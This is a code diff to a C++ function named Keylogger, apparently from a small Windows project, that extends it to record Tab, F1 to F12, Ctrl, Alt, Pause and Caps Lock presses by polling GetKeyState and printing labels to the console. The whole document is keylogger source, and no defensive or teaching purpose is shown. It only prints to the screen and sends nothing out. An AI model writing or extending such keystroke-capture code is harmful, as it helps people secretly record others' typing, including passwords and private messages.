@@ -137,7 +137,7 @@ void Keylogger(int delai) {
 		}
 		if (GetKeyState(VK_SPACE) & 0x8000) {
 	 
-			cout << " ";
+			cout << "[SPACE] ";
 			this_thread::sleep_for(chrono::milliseconds(delai));
 		}
 		if (GetKeyState(VK_RETURN) & 0x8000) {
@@ -198,7 +198,74 @@ void Keylogger(int delai) {
 			this_thread::sleep_for(chrono::milliseconds(delai));
 			
 		}
-
+		if (GetKeyState(VK_TAB) & 0x8000) {
+			cout << "[TAB] ";
+			this_thread::sleep_for(chrono::milliseconds(delai));
+		}
+		if (GetKeyState(VK_F1) & 0x8000) {
+			cout << "[F1] ";
+			this_thread::sleep_for(chrono::milliseconds(delai));
+		}
+		if (GetKeyState(VK_F2) & 0x8000) {
+			cout << "[F2] ";
+			this_thread::sleep_for(chrono::milliseconds(delai));
+		}
+		if (GetKeyState(VK_F3) & 0x8000) {
+			cout << "[F3] ";
+			this_thread::sleep_for(chrono::milliseconds(delai));
+		}
+		if (GetKeyState(VK_F4) & 0x8000) {
+			cout << "[F4] ";
+			this_thread::sleep_for(chrono::milliseconds(delai));
+		}
+		if (GetKeyState(VK_F5) & 0x8000) {
+			cout << "[F5] ";
+			this_thread::sleep_for(chrono::milliseconds(delai));
+		}
+		if (GetKeyState(VK_F6) & 0x8000) {
+			cout << "[F6] ";
+			this_thread::sleep_for(chrono::milliseconds(delai));
+		}
+		if (GetKeyState(VK_F7) & 0x8000) {
+			cout << "[F7] ";
+			this_thread::sleep_for(chrono::milliseconds(delai));
+		}
+		if (GetKeyState(VK_F8) & 0x8000) {
+			cout << "[F8] ";
+			this_thread::sleep_for(chrono::milliseconds(delai));
+		}
+		if (GetKeyState(VK_F9) & 0x8000) {
+			cout << "[F9] ";
+			this_thread::sleep_for(chrono::milliseconds(delai));
+		}
+		if (GetKeyState(VK_F10) & 0x8000) {
+			cout << "[F10] ";
+			this_thread::sleep_for(chrono::milliseconds(delai));
+		}
+		if (GetKeyState(VK_F11) & 0x8000) {
+			cout << "[F11] ";
+			this_thread::sleep_for(chrono::milliseconds(delai));
+		}
+		if (GetKeyState(VK_F12) & 0x8000) {
+			cout << "[F12] ";
+			this_thread::sleep_for(chrono::milliseconds(delai));
+		}
+		if (GetKeyState(VK_CONTROL) & 0x8000) {
+			cout << "[CTRL] ";
+			this_thread::sleep_for(chrono::milliseconds(delai));
+		}
+		if (GetKeyState(VK_MENU) & 0x8000) {
+			cout << "[ALT] ";
+			this_thread::sleep_for(chrono::milliseconds(delai));
+		}
+		if (GetKeyState(VK_PAUSE) & 0x8000) {
+			cout << "[PAUSE] ";
+			this_thread::sleep_for(chrono::milliseconds(delai));
+		}
+		if (GetKeyState(VK_CAPITAL) & 0x8000) {
+			cout << "[MAJ] ";
+			this_thread::sleep_for(chrono::milliseconds(delai));
+		}
 	}
 }
 
